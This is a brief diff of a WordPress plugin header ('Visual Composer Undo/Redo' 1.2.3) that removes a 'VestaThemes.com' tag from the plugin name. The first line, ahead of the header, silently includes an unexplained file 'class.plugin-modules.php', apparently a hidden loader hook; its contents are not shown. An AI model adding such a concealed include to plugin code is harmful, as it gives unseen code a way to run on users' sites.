@@ -1,6 +1,6 @@
 <?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
 /*
-Plugin Name: Visual Composer Undo/Redo |  VestaThemes.com
+Plugin Name: Visual Composer Undo/Redo
 Plugin URI: http://codecanyon.net/user/ERROPiX/portfolio?ref=ERROPiX
 Description: An addon that allow you to Undo or Redo your most recent changes while you are editting your post and pages.
 Version: 1.2.3
